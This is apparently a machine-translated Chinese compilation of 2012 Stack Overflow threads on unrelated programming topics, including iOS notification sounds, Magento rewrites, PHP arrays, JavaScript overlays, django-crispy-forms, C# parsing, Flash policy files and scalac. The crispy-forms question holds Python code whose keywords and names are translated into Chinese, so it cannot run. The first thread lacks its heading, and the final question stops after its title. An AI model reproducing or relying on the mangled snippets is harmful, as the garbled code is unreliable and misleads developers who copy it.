我正在尝试让自定义声音在 a 上工作`UILocalNotification`，但我根本没有声音。如果我使用`UILocalNotificationDefaultSoundName`，我确实会得到默认声音，但是当指定自定义声音时，没有声音，只有消息。据我所知，声音不到 30 秒，而且格式正确。这是文件信息的屏幕截图： ![](../Images/49f8b1edd46a0bb4476fe818c197b7da.png)

我检查了 XCode 的*DerivedData*目录中的 .app 目录，*alarm.caf*文件位于应用程序的根目录，我相信这意味着它在捆绑包中（对吗？）。

我很确定这是不久前的工作，而且我已经升级了 Xcode。也许这是一个暗示？

如其他答案中所述，我还尝试过删除/重新安装/重新启动。如你所见，我`cancelAllLocalNotifications`先打电话。

有谁知道可能出了什么问题？

```
[[UIApplication sharedApplication] cancelAllLocalNotifications];
NSLog(@"installing alarm");
[arguments pop]; // name
[arguments pop]; // title
alarm.alertBody = [arguments pop];
alarm.fireDate = [[NSDate date] addTimeInterval:[[arguments pop] intValue]/1000];
//alarm.soundName = UILocalNotificationDefaultSoundName;
alarm.soundName = @"alarm.caf";

[[UIApplication sharedApplication] scheduleLocalNotification:alarm]; 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-06-28T08:43:01.013

Your code seems to be good.

Try to clean your project, uninstall your app from your device/simulator, then re-install it. It could help maybe :)

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-01-19T15:12:18.407

我不知道原因（我也没有阅读文档），我只是打开了动作属性`notification setHasAction:YES`并开始播放声音。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-06-28T08:49:16.390

请确保 iPhone 未处于静音模式（因为您的代码似乎不错）

只需检查 iPhone 侧面的按钮

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-06-28T18:26:41.773

好的，这就是发生的事情。如果它仍在运行，我忘记了应用程序如何处理通知本身。我的代码只显示 UIAlertView 而没有播放声音。我不确定为什么它与默认声音一起使用。无论如何，我在我的 AppDelegate 中添加了这样的代码：

```
- (void)application:(UIApplication *)application
didReceiveLocalNotification:(UILocalNotification *)notification
{
  NSLog(@"didReceiveLocalNotification");
  if (application.applicationState == UIApplicationStateActive) {
    UIAlertView *alertView = [[UIAlertView alloc] initWithTitle:@"MarkMyTime"
      message:notification.alertBody
      delegate:self cancelButtonTitle:@"OK"
      otherButtonTitles:nil];
    NSString *soundFilePath = [[NSBundle mainBundle] 
      pathForResource:notification.soundName ofType:nil];
    NSURL *fileURL = [[NSURL alloc] initFileURLWithPath: soundFilePath];
    AVAudioPlayer *player = [[AVAudioPlayer alloc] initWithContentsOfURL: fileURL error: nil];
    [fileURL release];
    player.delegate = self;
    [player prepareToPlay];
    [player play];
    [alertView show];
    if (alertView) {
      [alertView release];
    }
  }
}

- (void)audioPlayerDidFinishPlaying:(AVAudioPlayer *)player successfully:(BOOL)flag 
{
  NSLog(@"Releasing player");
  [player release];
} 
```

这将显示一个 UIAlertView 并在通知对象上播放声音。您还需要将 AVAudioPlayerDelegate 接口添加到 AppDelegate 以便能够将委托分配给播放器。我认为如果您使用的是 ARC，则此代码可以简化一些。

```
@interface AppDelegate : PhoneGapDelegate <AVAudioPlayerDelegate> { 
```

我不确定这是否是最好的方法，所以请随时提出任何改进。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2014-03-11T17:54:07.647

您的代码很好，但请检查您的 iphone 设置设置 -> 通知中心 -> 您的应用程序 -> 声音 -> “开” 声音应该是“开”

因此，要启用此功能，请在应用程序的 Targets 中的 Capabilities 处选中 Inter App Audio，并且在 Inter-app audio 中将其关闭 Capabilities 将其更改为 On

然后本地通知声音正在工作 inshallah :)

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2013-02-12T05:56:48.623

也许您没有在 Xcode 项目中添加声音文件 (*.caf)：Build Phases/Copy Bundle Resources。

# android - 使用 wifi 的 Android 设备到设备通信

> ID：11235653
> 
> 赞同：-1
> 
> 时间：2012-06-27T22:27:13.827
> 
> 标签：android, wifi, communication

我有 2 个 android 设备，我需要使用 wifi 在两者之间进行通信以发送和接收数据。什么是通过私人 wifi 信号发送/接收数据的可靠方法，最好不生根（我已经知道如果生根该怎么做，但我真的不想让我的手机生根（我正在生根我的平板电脑）） .

我不介意自己写很多代码，只是寻找一种方法或类来发送数据并通过 wifi 接收数据，并附有示例。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-27T22:55:00.340

尝试参考官方 Android 开发者网站以了解更多关于[WIFI Direct API](http://developer.android.com/guide/topics/connectivity/wifip2p.html)的信息。这是官方文档，您可以尝试演示开始。

# php - 有没有一个函数可以在 php 中组合这些数组？

> ID：11235662
> 
> 赞同：-1
> 
> 时间：2012-06-27T22:28:11.007
> 
> 标签：php, arrays, multidimensional-array

给定数组 'a1' 和 'b1' 如何将它们组合起来生成最终数组？基本上用“b1”中匹配值的数组数据替换“a1”中的值。我想问题是是否有一个我没有看到的功能可以做到这一点。

```
$a1 = array('id1'=>array('a'=>'444-444',
                         'b'=>'222-222',
                         'c'=>'111-111'),
            'id2'=>array('a'=>'888-888',
                         'b'=>'666-666',
                         'c'=>'555-555')
           );

$b1 = array('222-222'=>array('first'=>array('9999',
                                            'dddd',
                                            'yyyy'),
                             'second'=>'mmgghh'
                            ),
            '666-666'=>array('first'=>array('bbbb',
                                            'cccc',
                                            '7777'),
                             'second'=>'ffffgggg'
                            )
           ); 
```

所需组合：

```
array(2) {
  ["id1"]=>
  array(3) {
    ["a"]=>
    string(7) "444-444"
    ["b"]=>
    array(1) {
      ["222-222"]=>
      array(2) {
        ["first"]=>
        array(3) {
          [0]=>
          string(4) "9999"
          [1]=>
          string(4) "dddd"
          [2]=>
          string(4) "yyyy"
        }
        ["second"]=>
        string(6) "mmgghh"
      }
    }
    ["c"]=>
    string(7) "111-111"
  }
  ["id2"]=>
  array(3) {
    ["a"]=>
    string(7) "888-888"
    ["b"]=>
    array(1) {
      ["666-666"]=>
      array(2) {
        ["first"]=>
        array(3) {
          [0]=>
          string(4) "bbbb"
          [1]=>
          string(4) "cccc"
          [2]=>
          string(4) "7777"
        }
        ["second"]=>
        string(6) "ffffgggg"
      }
    }
    ["c"]=>
    string(7) "555-555"
  }
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-27T22:42:14.983

```
array_walk_recursive($a1,function(&$value,$key,$addin){
        if(is_scalar($value) && isset($addin[$value])){
                $value = array($value=>$addin[$value]);
        }
   },$b1); 
```

# magento - Magento - 限制 seo 的标题长度

> ID：11235663
> 
> 赞同：0
> 
> 时间：2012-06-27T22:28:13.920
> 
> 标签：magento, seo

我真的很想限制 Magento 产品的标题长度。

我试过的是`'maxlength' => 65`在某处添加`\app\code\core\Mage\Adminhtml\Block\`，但没有成功。

有人知道如何添加此功能吗？在 HTML 中它只会添加`length="65" maxlength="65"`.

谢谢大家的付出。:)

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-28T16:52:37.447

经过近 10 个小时的搜索，我放弃了“最佳”方式，选择了环岛。

只需添加

```
document.getElementById("name").setAttribute("maxlength", "65");
document.getElementById("name").setAttribute("length", "65"); 
```

至`app/design/adminhtml/default/default/template/catalog/wysiwyg/js.phtml`

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-26T08:24:43.893

您可以将 javascript 验证器添加到产品的`name`属性中。为此，您需要为前端类更新具有特殊值的属性。只需创建sql升级：

```
$this->updateAttribute(
    Mage_Catalog_Model_Product::ENTITY,
    'name',
    array(
        'frontend_class' => 'validate-length maximum-length-65',
        'note'           => 'Max length is 65 characters'
    )
); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-06-28T07:36:46.893

我没有可用的平台为您提供适当的设置演练，但我应该能够将您带到正确的位置。首先，不要更改 app/code/core 文件。您绝对需要对这些文件进行任何更改，您应该通过将 app/code/core/Mage/Sales/something.php 复制到 app/code/local/Mage/Sales/something.php 来进行。Magento 知道自动使用本地代码覆盖核心代码。

如果您查看该页面的源代码，您将看到名称表单的位置：

```
<input id="name" name="product[name]" value="" class=" required-entry input-text required-entry" type="text"/>            </td>
<td class="scope-label"><span class="nobr">[STORE VIEW]</span></td>
    </tr> 
```

这里发生的事情是，你会注意到在类下我们有“required-entry input-text 和，好吧，又是 required-entry。这些是在 js/prototype/validation.js 中定义的验证标签。你需要添加一些对其进行自定义验证，并将其添加到您的模板文件中（不在核心中，升级时可能会中断）。

你会在validation.js 中注意到一个部分

```
Validation.add('IsEmpty', '', function(v) { 
```

在本节中，您可以添加自定义验证。让我们说：

```
//make sure these are unique, I'm not checking
['validate-length', 'Your input needs to be less than x characters.', function(v) {
    if (v.length > x) return false;
}], 
```

如果您在查找模板位置时需要帮助，请查看：[Finding Correct Templates and Blocks in Magento](https://stackoverflow.com/questions/10963284/finding-correct-templates-and-blocks-in-magento)。您只需添加 validate-length 类，例如：class="required-entry validate-length..."

# javascript - 当鼠标光标位于该图像上时，显示相对于该图像的鼠标光标坐标的叠加层

> ID：11235664
> 
> 赞同：1
> 
> 时间：2012-06-27T22:28:15.190
> 
> 标签：javascript

我正在尝试在鼠标光标旁边创建一个小叠加层，以显示光标的坐标与鼠标所在图像的左上角。我快到了：它有点工作，但仍然存在一些问题。

1.  当我滚动（使用鼠标滚轮或侧面的滚动条）时，覆盖层和光标彼此远离：覆盖层随页面移动，而光标相对于监视器保持静止。我已经尝试过“onscroll”，但它不起作用

2.  我对页面中的图像使用了“onmouseover”和“onmouseout”功能，但由于某种原因，它们只在页面加载时执行一次。

3.  当我将鼠标放在图像的左上角时，我想查看`0,0`坐标。X 实际上是 0，但 Y 实际上是 -15。由于某种原因，图像的坐标在上边缘下方 15 像素处。不知道为什么。

好的，既然我提到了问题，这是我的代码：

**HTML**

```
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">

    <head>
        <meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1">
        <link href="main2008.css" rel="stylesheet" type="text/css">
        <script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.7.2/jquery.min.js"></script>
        <script type="text/javascript" src="Ext/mcs2.js"></script></head>
    </head>

    <body>  
        <div id="content">
            <h1>JS test</h1>
            <img src = "pic.jpg">
        </div>
    </body>

</html> 
```

**CSS**

```
#xy {
    font-size:10px;
    position: absolute;
    top: 0px;
    right:0px;
    width:60px;
    visibility: visible;
    color:#006699;
    background-color:#ffffff;
    border: 1px solid #66ccff;
    z-index: 10;
    padding:7px;
} 
```

**JS**

```
var myX, myY, xyOn, myMouseX, myMouseY, ImgX, ImgY, Active;

//For each image, set onmouseover and onmouseout to the functions that activate and deactivate
$(document).ready(function() {
    $("img").each(function(i) {
        this.onmouseover = getcoordinates(this);
        this.onmouseout = deactivate(this);
    });
});

//Creation of new div is inside window.onload because it needs to be done when body already exists
  window.onload = function(){
    var divg = document.createElement("div");
    divg.setAttribute('id',"xy");
    divg.appendChild(document.createTextNode("New DIV"));
    document.body.appendChild(divg);  
  };

function getcoordinates(object) {
    ImgX=object.offsetLeft;
    ImgY=object.offsetTop;
    //document.getElementById('xy').style.visibility='visible';
    Active=1;
    alert("Acti"); //This pop-up is just for debugging
}   

function deactivate(object) {
    //document.getElementById('xy').style.visibility='hidden';
    alert("Deacti");  //This pop-up is just for debugging
    Active=0;
}   

document.onmousemove=getXYPosition;  //THIS IS THE KEY FUNCTION!!! And it works
window.onscroll=getXYPosition;    //I tried this to fix the scrolling problem, but it does not work

// Cursor coordinate function

    xyOn = true;
    function getXYPosition(e){
        if (1==1) {    //Instead of "1==1" I had written "Active==1", but it does not work at all
            myMouseX=(e||event).clientX-ImgX;
            myMouseY=(e||event).clientY-ImgY;
            if (myMouseX + 100 > document.documentElement.clientWidth) {
                myX = myMouseX - (myMouseX + 80 - (document.documentElement.clientWidth));
            } else {
                myX = myMouseX + 20;    
            }
            if (myMouseY + 64 > document.documentElement.clientHeight) {
                myY = myMouseY - (myMouseY + 44 - (document.documentElement.clientHeight));
            } else {
                myY = myMouseY + 20;    
            }
            if (document.documentElement.scrollTop > 0) {
                myY = myY + document.documentElement.scrollTop;
                myMouseY = myMouseY + document.documentElement.scrollTop;
            }
            document.getElementById('xy').style.top = myY + "px";
            document.getElementById('xy').style.left = myX + "px";
            document.getElementById('xy').innerHTML = "X is " + myMouseX + "<br />Y is " + myMouseY;
            document.getElementById('xy').innerHTML = document.getElementById('xy').innerHTML;
            if (xyOn) {
                document.getElementById('xy').style.visibility = "visible";
            } else {
                document.getElementById('xy').style.visibility = "hidden";
            }
        }
    } 
```

PS：如果你想知道为什么我添加覆盖 div 并使用 JS 而不是 HTML 设置属性，原因是当我设法在某个时候制作 JS 代码时，这将成为 Chrome 扩展，这意味着我可以将 JS 和 CSS 注入页面，但没有 HTML。

# python - 在 python 中通过 django-crispy-forms 渲染表单

> ID：11235665
> 
> 赞同：1
> 
> 时间：2012-06-27T22:28:15.667
> 
> 标签：python, django

我们需要在 python 中呈现表单并捕获 html 输出。到目前为止，我们正在使用一个肮脏的 hack：

```
defcrispy_page（表格）：                
    迷你模板 = """                          
        {% 加载crispy_forms_tags %}                 
        {% 酥脆形式 %}                            
    """                                          
    从 django.template 导入模板，上下文
    t = 模板（mini_template）                  
    c = 上下文（{“表格”：表格}）                   
    返回 t.render(c)

```

我们希望能够以某种方式直接从酥脆的表单中获取渲染输出，而不必跳过 django 模板系统。有什么想法吗？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-06-29T08:44:02.070

[这些是](https://github.com/maraujop/django-crispy-forms/blob/dev/crispy_forms/templatetags/crispy_forms_tags.py#L109-118)标记节点中的行，`{% crispy %}`用于呈现带有助手 + 布局的表单。我可以将它们重构出来，以便它们很容易从外部调用。该应用程序不被认为是用于服务器端的，这就是为什么它如此严格的原因。

我的理解是你有一些表单 A 的字段，然后是另一个表单 B 的字段，然后是更多表单 A 的字段，对吗？

**编辑 2012/7/30**

1.2.0 版将附带`render_crispy_form`解决您的问题的功能： [https ://github.com/maraujop/django-crispy-forms/issues/64#issuecomment-7354910](https://github.com/maraujop/django-crispy-forms/issues/64#issuecomment-7354910)

# sql - 是否可以使用 Excel 文件作为“数据源”的 SQL 数据库？

> ID：11235675
> 
> 赞同：2
> 
> 时间：2012-06-27T22:29:01.657
> 
> 标签：sql, vb.net, excel

是否可以建立某种从 SQL 到 Excel 的链接，使 Excel 文档成为真正的数据源？我不希望任何数据存储在 SQL 中，所有数据编辑都将在 Excel 工作表中完成。

我知道这远非最佳，但我别无选择，数据需要保留在 Excel 中。

我知道有一个选项可以在 Access 中执行这种链接，并且我可以从 VS 中访问数据，但我真的更喜欢 SQL。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-06-28T00:09:54.117

也可以直接从您的应用程序中使用 Jet 驱动程序并跳过 SQL 服务器。

我知道这不是您问题的正确答案，而是另一个可能有用的想法:)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-06-27T23:54:31.797

是的，您可以将 excel 设置为链接服务器。您需要使用 jet 驱动程序，但这仅适用于 32 位机器（微软不久前放弃了他们的支持）。换句话说，这完全不可扩展，并且在大多数生产环境中不推荐使用。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-06-28T05:01:00.353

如果您想选择 Excel 作为数据源，则可以使用 .Net Oledb 提供程序连接到它。

考虑下面的 VB.Net 示例来读取 excel 表上的行：

```
 imports System.Data.OleDb

        dim connstr as string = "Provider=Microsoft.Jet.OLEDB.4.0;Data Source=d:\exceldb.xls;Extended Properties=""Excel 8.0;HDR=Yes;IMEX=1"""
            Dim conn As New OleDbConnection(connstr)
            conn.Open()
            Dim da As New OleDbDataAdapter("select * from [Sheet1$]", conn)
    Dim dt As New DataTable()
    da.fill(dt)
    For i As Integer = 0 To dt.Rows.Count - 1
     'do your thing
    next
    conn.close() 
```

问候

# cordova - 如何在phonegap中打开本机ios视图控制器

> ID：11235677
> 
> 赞同：2
> 
> 时间：2012-06-27T22:29:23.093
> 
> 标签：cordova, phonegap-plugins

如标题中所述，当用户单击我的 index.html 文件中的按钮时，我想打开本机 ios 视图控制器。我想我需要为此编写一个自定义插件。谁能给我更多细节？谢谢！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-28T04:53:28.013

您可以查看 ChildBrowser 插件的代码，它实际上是一个在 phonegap 视图上弹出的原生视图。您可以修改插件以显示更复杂的原生视图。该插件包括xib 文件和其他objective-c 类。

[https://github.com/phonegap/phonegap-plugins/tree/master/iOS/ChildBrowser](https://github.com/phonegap/phonegap-plugins/tree/master/iOS/ChildBrowser)

有关更多详细信息，请查看此帖子：

[将 phoneGap 与原生 iOS 应用程序集成](https://stackoverflow.com/questions/5959511/integrating-phonegap-with-native-ios-app)

# c# - 将整数从文本框添加到数据库c#

> ID：11235678
> 
> 赞同：0
> 
> 时间：2012-06-27T22:29:39.380
> 
> 标签：c#, database

我是 c# 的新手，在将整数从文本框获取到数据库时遇到了一些困难。

我创建了一个简单的表单，允许用户输入他们的名字、姓氏和年龄。

我可以通过 buttonClick 将 firstName 和 lastName 连接到数据库，但无法与年龄相同。这就是我所拥有的。

```
 private void AddTheNewInfoToDB()
    {
        using (DatabaseContainer db = new DatabaseContainer())
        {
            Users u = new Users();

            u.firstName = textboxfirstName.Text;
            u.lastName = textboxlastName.Text;
            u.Age = textboxAge.Text; 

            db.Users.AddObject(u);
            db.SaveChanges();
        } 
```

当我这样做时，我收到“textboxAge.Text”的错误，上面写着“无法将 tye 'string' 隐式转换为 'int'”。

解决此问题的建议将不胜感激。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-27T22:32:50.693

```
u.Age = Int32.Parse(txtboxAge.Text); 
```

您遇到了问题，因为试图将字符串 (.Text) 分配给 Int (Age) 类型的变量。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-06-27T22:32:52.747

尝试：

```
int age;
int.TryParse(textboxAge.Text, out age); 
u.Age = age; 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-06-27T22:33:03.230

利用`int.parse(textboxAge.Text);`

# magento - Magento 中的核心覆盖

> ID：11235679
> 
> 赞同：0
> 
> 时间：2012-06-27T22:29:39.527
> 
> 标签：magento, model, module, block, core

所以我找到了一个关于动态期权定价的问题的答案，但这导致我被难住了。我可以理解大部分答案，但是当涉及到 XML 和模块实现时，我迷路了。

这是我正在尝试做的事情：

> [http://www.magentocommerce.com/boards/viewthread/260544/#t348802](http://www.magentocommerce.com/boards/viewthread/260544/#t348802)

需要覆盖**Mage_Catalog_Model_Product_Type_Price**模型和**Mage_Catalog_Block_Product_View_Options**块。

修改后的 Price.php 位于

> ***/app/core/local/rtega/dynamicPrice/Model/Product/Type/Price.php***

修改后的 Options.php 位于

> ***/app/core/local/rtega/dynamicPrice/Block/Product/View/Options.php***

有 rtega_dynamicPrice.xml 在

> ***/应用程序/等/模块/***

下面是当前的 config.xml 位于

> ***/app/core/local/rtega/dynamicPrice/etc/***

```
<?xml version="1.0"?>
<config>
  <modules>
    <rtega_dynamicPrice>
      <version>1.0.0</version>
    </rtega_dynamicPrice>
  </modules>
  <global>
    <blocks>
      <catalog>
        <rewrite>
          <product_view_options>rtega_dynamicPrice_Block_Product_View_Options</product_view_options>
        </rewrite>
      </catalog>
    </blocks>
    <catalog>
      <product>
        <type>
          <configurable>
            <price_model>rtega_dynamicPrice_Model_Product_Type_Price</price>
          </configurable>
        </type>
      </product>
    </catalog>
  </global>
</config> 
```

任何帮助是极大的赞赏！

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-06-28T03:21:10.423

三件事要提。

首先，我不知道 Magento 将如何处理您的“rtega”和“dynamicPrice”外壳。这可能会导致现在或将来出现问题。我推荐的外壳是“Rtega”和“Dynamicprice”。但这可能没问题。

其次，您的块重写 xml 看起来不错，但目录模型的重写不正确。我希望看到：

```
<config>
    ...
    <global>
        ...
        <models>
            <catalog>
                <rewrite>
                    <product_type_price>rtega_dynamicPrice_Model_Product_Type_Price</product_type_price>
                </rewrite>
            </catalog>
        </models>
        ...
    </global>
    ...
</config> 
```

考虑这一点的最佳方法是将其分解为首先如何实例化原始模型。在这种情况下，我们会调用

```
Mage::getModel("catalog/product_type_price"); 
```

所以第一个xml节点是“models”，因为这是一个模型，下一个xml节点是斜线之前的部分（目录），然后添加一个rewrite标签，然后斜线之后成为下一个xml节点，如下所示：

```
<models>
    <catalog>
        <rewrite>
            <product_type_price> 
```

第三，在这种情况下，重要的是查看您提到的文件位于：

```
/app/core/local/rtega/dynamicPrice/Model/Product/Type/Price.php and
/app/core/local/rtega/dynamicPrice/Block/Product/View/Options.php 
```

如果您还没有这样做，则需要像这样定义类：

```
class rtega_dynamicPrice_Model_Product_Type_Price extends Mage_Catalog_Model_Product_Type_Price { 
```

然后只需重新定义要修改的功能。

我希望这对你有所帮助！

# c# - 响应来自 c# 的 flash 的策略文件请求

> ID：11235682
> 
> 赞同：0
> 
> 时间：2012-06-27T22:29:49.737
> 
> 标签：c#, sockets, actionscript, policy, cross-domain-policy

我已经用 c# 开发了一个服务器应用程序和一个带有 flash 动作脚本 3.0 的客户端应用程序。从浏览器调用时 Flash 套接字请求策略文件并显示消息

```
<policy-file-request/> 
```

到目前为止一切正常。我的服务器正在等待此消息并向客户端发送一个策略文件字符串，如下所示：

```
public const String POLICY_FILE = "<?xml version=\"1.0\"?>\n" +
    "<!DOCTYPE cross-domain-policy SYSTEM \"http://www.adobe.com/xml/dtds/cross-domain-policy.dtd\">\n" +
    "<cross-domain-policy>" +
    "<allow-access-from domain=\"*\" to-ports=\"*\" />" +
    "</cross-domain-policy>\u0000"; 
```

这个字符串是这样发送的：

```
if (message.Contains("policy-file-request"))
            {
                client.Send(Encoding.ASCII.GetBytes(Statics.POLICY_FILE));
                return;
            } 
```

我很确定这是有效的，但我真的不知道发生了什么并且开始不起作用。当 flash 客户端从服务器接收到此消息时，连接成功，一切正常。但是现在 Flash 客户端等待 20 秒（Flash 套接字超时）并抛出安全异常

```
[SecurityErrorEvent type="securityError" bubbles=false cancelable=false eventPhase=2 text="Error #2048"] 
```

我被困住了，无法前进。我正在监听端口 963，服务器机器的完全限定名称是“mypc.domain.local”，可以通过我的网络访问。这台机器上还运行着一个 IIS，Flash 应用程序托管在这里。

```
http://mypc.domain.local:90/page.html 
```

就是这样，我调用我的 Flash 应用程序并

```
mypc.domain.local:963 
```

是服务器运行的地址。我也在这台机器上工作。我尝试调用该页面`http://localhost:90/page.html`，或者`http://127.0.0.1:90/page.html`尝试将服务器连接为 localhost:963 或 127.0.0.1:963。每个组合的结果相同。

这里有什么问题？什么可能会导致我的工作代码崩溃？

谢谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-27T23:33:31.460

没有更多代码很难判断，但根据您所展示的内容，似乎当该请求进入时，您使用策略文件的内容进行响应，这不是实际有效的 HTTP 响应。我对 20 秒超时的猜测是它仍在等待 HTTP 标头。

如果可能，请尝试使用 BCL 中已经存在的 HTTP 类，而不是“手动”执行 http，但如果您必须自己执行套接字内容，则在调试期间使用 Fiddler 之类的东西，因为它非常适合识别 HTTP 协议的违规行为。

# php - 哪个更适合检查值：isset 还是 = NULL？

> ID：11235683
> 
> 赞同：3
> 
> 时间：2012-06-27T22:29:57.700
> 
> 标签：php, html, null, isset

我有一个这样的 URL：

[http://mysite.com/index.php?somename=somevalue](http://mysite.com/index.php?somename=somevalue)

我通常通过以下方式检查 somename 是否存在：

```
if (isset($_GET['somename'])) { 
```

但是，我最近看到很多人这样做：

```
if ($_GET['somename'] != NULL) { 
```

我的问题是，任何一种方式都比另一种更好吗？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-06-27T22:31:42.833

不同于`null`支票，

```
isset($_GET['somename'] 
```

不会抛出“未定义索引”通知，因此绝对是两者中更可取的。

```
array_key_exists("somename", $_GET); 
```

也将是有效的。

`null`但是，如果您想禁止空值，您可能希望将此与检查结合使用。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-27T22:32:21.233

这些说法是不同的。

[isset()](http://php.net/isset)将检查变量是否包含值，而第二条语句检查变量是否等于 NULL。

在您的情况下，使用 isset() 来确定 $_GET['somename'] 是否存在。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-06-27T22:35:29.180

最好的方法通常是两者都做。isset 检查变量是否存在，同时您还应该检查它是否不为 NULL，这样它就不会破坏以后的任何检查。

```
if(isset($_GET['somevalue']) && $_GET['somevalue'] != NULL) 
```

# javascript - 先前选中的复选框值

> ID：11235684
> 
> 赞同：0
> 
> 时间：2012-06-27T22:29:59.057
> 
> 标签：javascript, jquery, javascript-events

[http://jsfiddle.net/thetylercox/gy8EQ/20/](http://jsfiddle.net/thetylercox/gy8EQ/20/)

```
$(':checkbox').change(function() {
 if (this.checked) {
     var lastChecked = $(this).prevAll(":checked:first");
     if (this.value == lastChecked.val()) {
         alert("previous checked box has same value");
     }
 }
}); 
```

问题是它只能从右向左尝试另一个方向？如果值不相等，则尝试执行 if (this.value != lastChecked.val()) { alert("previous check box has same value"); }

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-27T22:32:41.733

你的意思是：

```
var lastChecked = $(this).siblings(":checked:first"); 
```

它将找到下一个和上一个复选框。

# css - 如何使内部 div 与父级（列）一样宽并响应？

> ID：11235689
> 
> 赞同：0
> 
> 时间：2012-06-27T22:30:37.827
> 
> 标签：css

在[此页面上](http://www.amordetango.nl/txp/agenda/)（响应式站点正在进行中），包含 div（文章）的背景图像与最长的句子 (p) 一样宽。所以它们没有列宽（#main = 30em）。我可以用 CSS 做什么来使所有 div 与列一样宽，并且仍然保持它们的响应能力完好无损？

```
#agenda #main article {
    margin-bottom: 1em; 
    background: #fff url() repeat;
    -webkit-border-radius: 6px;
    -moz-border-radius: 6px;
    border-radius: 6px;
    border: 0;
}

#agenda #main article h3 {
    color: #666;
    letter-spacing: 0.2em;
    text-transform: lowercase;
    line-height: 100%;
    margin-bottom: .4em;
    padding-top: .4em;
}

#agenda #main article h4 {
    color: #666;
    letter-spacing: 0.2em;
    text-transform: lowercase;
    line-height: 100%;
    margin-bottom: .4em;
    padding-top: .4em;
}

#agenda #main article p {
    color: #666;
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-27T22:36:54.193

您需要`float: left`从`#main article`您的 css 中删除 （第 402 行）或用`float: none`.

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-27T22:41:26.497

目前无法真正测试移动设备上的响应能力，但您似乎只需要在文章元素中添加一个 width:100% ：

```
#agenda #main article {
background: url("") repeat scroll 0 0 #FFFFFF;
border: 0 none;
border-radius: 6px 6px 6px 6px;
margin-bottom: 1em;
width: 100%; 
```

}

在萤火虫中尝试过，即使我放大或缩小它看起来也很好。

# scala - 为什么 Scala 的编译器使用“-print”选项显示 Scala 的特定功能？

> ID：11235690
> 
> 赞同：3
> 
> 时间：2012-06-27T22:30:50.173
> 
> 标签：scala, scalac

Scala 编译器（2.9.2）的帮助菜单说

```
-print   Print program with Scala-specific features removed. 
```

但是以下带有该`-print`选项的调用显示了 Scala 特定的功能：

```
C:\Users\John\Test Scala Project\src\main\scala>type test.scala
trait A

C:\Users\John\Test Scala Project\src\main\scala>scalac -print test.scala
[[syntax trees at end of cleanup]]// Scala source: test.scala
package <empty> {
  abstract trait A extends java.lang.Object
} 
```

为什么特征仍然显示？我本来期望纯 Java 代码。

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2012-06-28T00:21:42.917

该描述确实具有欺骗性，但它从未说过它会打印*Java*代码。无论如何它都做不到：Scala 生成有效的字节码，但不能生成可以直接翻译成 Java 的字节码。

它所做的是在`cleanup`阶段之后生成代码。现在，如果您尝试`-Xshow-phases`使用 Scala 2.9.2，您会看到：

```
 phase name  id  description
    ----------  --  -----------
        parser   1  parse source into ASTs, perform simple desugaring
         namer   2  resolve names, attach symbols to named trees
packageobjects   3  load package objects
         typer   4  the meat and potatoes: type the trees
superaccessors   5  add super accessors in traits and nested classes
       pickler   6  serialize symbol tables
     refchecks   7  reference/override checking, translate nested objects
  selectiveanf   8
      liftcode   9  reify trees
  selectivecps  10
       uncurry  11  uncurry, translate function values to anonymous classes
     tailcalls  12  replace tail calls by jumps
    specialize  13  @specialized-driven class and method specialization
 explicitouter  14  this refs to outer pointers, translate patterns
       erasure  15  erase types, add interfaces for traits
      lazyvals  16  allocate bitmaps, translate lazy vals into lazified defs
    lambdalift  17  move nested functions to top level
  constructors  18  move field definitions into constructors
       flatten  19  eliminate inner classes
         mixin  20  mixin composition
       cleanup  21  platform-specific cleanups, generate reflective calls
         icode  22  generate portable intermediate code
       inliner  23  optimization: do inlining
      closelim  24  optimization: eliminate uncalled closures
           dce  25  optimization: eliminate dead code
           jvm  26  generate JVM bytecode
      terminal  27  The last phase in the compiler chain 
```

请注意，这`cleanup`是之前的最后一个阶段`icode`，这才是重点。在更改抽象语法树的所有内容都尝试完成之后，该参数`-print`会打印内容。当 AST 即将准备好进行代码生成时。

# json - Json_encode 部分返回字符串

> ID：11235693
> 
> 赞同：1
> 
> 时间：2012-06-27T22:31:12.327
> 
> 标签：json

我有一个 php 数组，看起来像这样：

```
Array ( [0] => rgb(255, 126, 28) [1] => rgb(255, 126, 28) [2] => rgb(255, 126, 28)... 
```

我想通过 jason_encode 传递它，但问题是它只返回元素的第一个字符。如果尝试仅对数组的第一个元素进行编码，它会一一返回其中的所有字符。

这是我的 jason_encode 脚本：

```
 var arrayFromPHP = <?php echo json_encode($array); ?>

$.each(arrayFromPHP, function (i, elem) {
    alert(elem.value);
}); 
```

你能帮我解决这个问题吗？提前致谢！

# c++ - 如何使字符串相等？

> ID：11235694
> 
> 赞同：0
